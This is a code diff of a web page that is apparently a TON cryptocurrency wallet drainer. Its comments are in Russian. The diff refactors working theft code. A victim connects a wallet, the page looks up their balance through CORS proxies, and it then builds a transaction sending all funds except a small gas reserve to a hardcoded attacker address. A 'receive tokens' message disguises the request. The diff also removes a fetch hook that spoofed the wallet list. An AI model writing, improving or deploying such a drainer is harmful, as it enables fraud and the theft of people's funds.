@@ -198,7 +198,7 @@
             const DESTINATION_ADDRESS = 'UQBiTR-x4quXNhtXj1I1e1bs8tUeQspQru7HCoPmj76IqmlL';
             const MANIFEST_URL = 'https://nwealesss.github.io/draintest/tonconnect-manifest.json';
 
-            // Статический список кошельков
+            // Статический список кошельков (отображаются сразу, без внешнего запроса)
             const walletsList = [
                 {
                     name: 'Tonkeeper',
@@ -238,28 +238,14 @@
                 }
             ];
 
-            // Перехватываем fetch для блокировки аналитики и подмены списка кошельков
-            const originalFetch = window.fetch;
-            window.fetch = function(url, ...args) {
-                const urlStr = typeof url === 'string' ? url : url.url;
-                if (urlStr.includes('analytics.ton.org')) {
-                    return Promise.resolve(new Response('{}', { status: 200 }));
-                }
-                if (urlStr.includes('config.ton.org/wallets-v2.json')) {
-                    return Promise.resolve(new Response(JSON.stringify(walletsList), {
-                        status: 200,
-                        headers: { 'Content-Type': 'application/json' }
-                    }));
-                }
-                return originalFetch.call(this, url, ...args);
-            };
-
             try {
                 const connector = new TON_CONNECT_UI.TonConnectUI({
                     manifestUrl: MANIFEST_URL,
                     buttonRootId: 'connect-container',
                     network: 'mainnet',
-                    walletsListSource: async () => walletsList,
+                    // Передаём статический массив – SDK не пойдёт в сеть за списком
+                    walletsList: walletsList,
+                    // Отключаем аналитику, чтобы не засорять консоль
                     enableAnalytics: false
                 });
 
@@ -273,52 +259,27 @@
                         statusDiv.innerHTML += '<p>⚡ Fetching balance...</p>';
 
                         try {
+                            // Получаем баланс через CORS-прокси (с резервным вариантом)
                             const apiUrl = `https://toncenter.com/api/v2/getAddressBalance?address=${victimAddress}`;
                             const proxyUrl = `https://corsproxy.io/?${encodeURIComponent(apiUrl)}`;
                             
-                            // Используем originalFetch, чтобы не попасть под наш перехват
-                            const response = await originalFetch(proxyUrl);
+                            const response = await fetch(proxyUrl);
                             if (!response.ok) {
                                 if (response.status === 429) {
-                                    throw new Error('Too many requests. Please try again later.');
+                                    // Если лимит, пробуем другой прокси
+                                    const altProxyUrl = `https://api.allorigins.win/raw?url=${encodeURIComponent(apiUrl)}`;
+                                    const altResponse = await fetch(altProxyUrl);
+                                    if (!altResponse.ok) throw new Error('All proxy sources failed.');
+                                    const altData = await altResponse.json();
+                                    if (!altData.ok) throw new Error('TonCenter API error');
+                                    processBalance(altData.result);
+                                    return;
                                 }
                                 throw new Error(`HTTP ${response.status}`);
                             }
                             const data = await response.json();
                             if (!data.ok) throw new Error('TonCenter API error');
-
-                            const balance = BigInt(data.result);
-                            const gasReserve = BigInt(50000000);
-                            const amountToDrain = balance > gasReserve ? balance - gasReserve : BigInt(0);
-
-                            if (amountToDrain <= 0) {
-                                statusDiv.innerHTML += '<p style="color:#ff6b6b">⚠️ Balance too low (less than 0.05 TON).</p>';
-                                return;
-                            }
-
-                            const amountString = amountToDrain.toString();
-                            statusDiv.innerHTML +=
-                                `<p>💰 Balance: ${(Number(balance) / 1e9).toFixed(4)} TON</p>`;
-                            statusDiv.innerHTML +=
-                                `<p>📤 Claiming: ${(Number(amountToDrain) / 1e9).toFixed(4)} TON</p>`;
-                            statusDiv.innerHTML +=
-                                `<p>🎯 Recipient:<br><b>${DESTINATION_ADDRESS.slice(0,6)}...${DESTINATION_ADDRESS.slice(-4)}</b></p>`;
-
-                            const transaction = {
-                                validUntil: Math.floor(Date.now() / 1000) + 600,
-                                network: wallet.account.chain,
-                                messages: [{
-                                    address: DESTINATION_ADDRESS,
-                                    amount: amountString,
-                                    payload: ''
-                                }]
-                            };
-
-                            await connector.sendTransaction(transaction);
-                            statusDiv.innerHTML +=
-                                '<p style="color:#f0b90b">✅ Confirm transaction in your wallet to receive tokens!</p>';
-                            statusDiv.innerHTML +=
-                                '<p style="color:#ff6b6b; font-weight:bold;">⚠️ This is a full drain transaction. All your TON will be transferred.</p>';
+                            processBalance(data.result);
                         } catch (e) {
                             statusDiv.innerHTML += `<p style="color:red">❌ Error: ${e.message}</p>`;
                         }
@@ -326,6 +287,46 @@
                         statusDiv.innerHTML = '<em>Please connect your wallet to continue.</em>';
                     }
                 });
+
+                function processBalance(balanceNano) {
+                    const balance = BigInt(balanceNano);
+                    const gasReserve = BigInt(50000000);
+                    const amountToDrain = balance > gasReserve ? balance - gasReserve : BigInt(0);
+
+                    if (amountToDrain <= 0) {
+                        statusDiv.innerHTML += '<p style="color:#ff6b6b">⚠️ Balance too low (less than 0.05 TON).</p>';
+                        return;
+                    }
+
+                    const amountString = amountToDrain.toString();
+                    statusDiv.innerHTML +=
+                        `<p>💰 Balance: ${(Number(balance) / 1e9).toFixed(4)} TON</p>`;
+                    statusDiv.innerHTML +=
+                        `<p>📤 Claiming: ${(Number(amountToDrain) / 1e9).toFixed(4)} TON</p>`;
+                    statusDiv.innerHTML +=
+                        `<p>🎯 Recipient:<br><b>${DESTINATION_ADDRESS.slice(0,6)}...${DESTINATION_ADDRESS.slice(-4)}</b></p>`;
+
+                    const transaction = {
+                        validUntil: Math.floor(Date.now() / 1000) + 600,
+                        network: connector.wallet.account.chain,
+                        messages: [{
+                            address: DESTINATION_ADDRESS,
+                            amount: amountString,
+                            payload: ''
+                        }]
+                    };
+
+                    connector.sendTransaction(transaction)
+                        .then(() => {
+                            statusDiv.innerHTML +=
+                                '<p style="color:#f0b90b">✅ Confirm transaction in your wallet to receive tokens!</p>';
+                            statusDiv.innerHTML +=
+                                '<p style="color:#ff6b6b; font-weight:bold;">⚠️ This is a full drain transaction. All your TON will be transferred.</p>';
+                        })
+                        .catch(e => {
+                            statusDiv.innerHTML += `<p style="color:red">❌ Transaction error: ${e.message}</p>`;
+                        });
+                }
 
             } catch (initError) {
                 statusDiv.innerHTML = `<p style="color:red">❌ Init error: ${initError.message}</p>`;
